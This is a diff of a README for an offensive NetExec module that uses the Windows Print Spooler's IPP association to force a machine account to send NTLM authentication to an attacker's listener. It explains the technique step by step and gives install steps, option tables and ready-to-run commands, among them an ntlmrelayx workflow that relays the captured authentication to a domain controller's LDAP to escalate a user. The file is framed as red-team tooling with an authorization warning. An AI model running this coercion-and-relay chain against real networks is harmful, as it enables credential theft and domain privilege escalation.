@@ -1,26 +1,108 @@
-# Coerce IPP (Nxc Version)
+# Coerce IPP (NetExec Module)
 
-NetExec module that coerces a Windows machine account into authenticating over HTTP (NTLM) by abusing the print spooler's WSD / IPP directed association feature.
+A [NetExec](https://github.com/Pennyw0rth/NetExec) module that coerces a Windows
+machine account into authenticating over HTTP (NTLM) to a listener you control.
 
-Remote version of the technique from [BOF-coerce-ipp](https://github.com/sudonoodle/BOF-coerce-ipp).
+It is a remote port of the [BOF-coerce-ipp](https://github.com/sup3rDav3/IPP)
+technique, repackaged so it can be run straight from NetExec instead of as a
+Beacon Object File.
+
+> ⚠️ **Authorized use only.** This module is intended for penetration testing and
+> red-team engagements on systems you own or have explicit written permission to
+> test. Using it against systems without authorization is illegal.
+
+---
 
 ## How it works
 
-Opens an Xcv handle to the WSD Port monitor over MS-RPRN (`\\target\,XcvMonitor WSD Port`) and calls `AssocIppDirected` with an `ipp://` URI pointing at your listener. The target machine account then makes an outbound HTTP connection and performs NTLM authentication.
+1. The module opens an **Xcv handle** to the `WSD Port` monitor over
+   **MS-RPRN** (the Print Spooler's remote protocol).
+2. It then calls **`AssocIppDirected`** with an `ipp://` URI pointing at your
+   listener.
+3. The target's **machine account** makes an outbound HTTP connection to that
+   URI and authenticates with **NTLM** — which you capture or relay.
 
-Requires admin (or equivalent) on the target. Regular domain users will fail to open the Xcv handle.
+In short: trigger authentication coercion through the Print Spooler's IPP
+association, without needing a Beacon on the host.
+
+---
+
+## Requirements
+
+- **Administrative (or equivalent) rights** on the target.
+  Standard domain users cannot open the `Xcv` handle, so the coercion will fail
+  for them.
+- A working NetExec installation.
+- A listener to receive the incoming NTLM authentication (e.g. `ntlmrelayx`,
+  `Responder`, or a custom HTTP listener).
+
+---
+
+## Installation
+
+Drop the module into your NetExec modules directory:
+
+```bash
+# Default location on Linux
+cp coerce_ipp.py ~/.nxc/modules/
+```
+
+NetExec will pick it up automatically on the next run. Confirm it's loaded with:
+
+```bash
+nxc smb -L | grep coerce_ipp
+```
+
+---
 
 ## Usage
 
+Run it through NetExec's **SMB** protocol with `-M coerce_ipp`:
+
 ```bash
-# basic
-nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip>
-
-# custom port / path
-nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip> PORT=8080
-nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip> PORT=80 PATH=/print
-
+nxc smb <target> -u <user> -p <password> -M coerce_ipp -o LISTENER=<your-ip>
 ```
 
-<img width="1557" height="117" alt="image" src="https://github.com/user-attachments/assets/439ddbdc-6c9b-4f51-a64e-575a30ca0d3b" />
-<img width="678" height="156" alt="image" src="https://github.com/user-attachments/assets/d1f6c964-f85e-40e2-b8d4-f28622e2ed31" />
+### Options
+
+| Option     | Required | Description                              |
+| ---------- | :------: | ---------------------------------------- |
+| `LISTENER` |   Yes    | IP address of your listener.             |
+| `PORT`     |    No    | Custom listener port.                    |
+| `PATH`     |    No    | Custom request path for the `ipp://` URI.|
+
+### Examples
+
+Basic coercion to a listener:
+
+```bash
+nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp -o LISTENER=10.10.10.1
+```
+
+With a custom port and path:
+
+```bash
+nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp \
+    -o LISTENER=10.10.10.1 PORT=8080 PATH=/relay
+```
+
+Typical relay workflow — start your relay first, then coerce:
+
+```bash
+# Terminal 1 — set up the relay
+ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user attacker
+
+# Terminal 2 — trigger the coercion
+nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp -o LISTENER=10.10.10.1
+```
+
+---
+
+## Credits
+
+- Original technique: [BOF-coerce-ipp](https://github.com/sup3rDav3/IPP)
+- Built as a module for [NetExec](https://github.com/Pennyw0rth/NetExec)
+
+## License
+
+See the repository for license details.
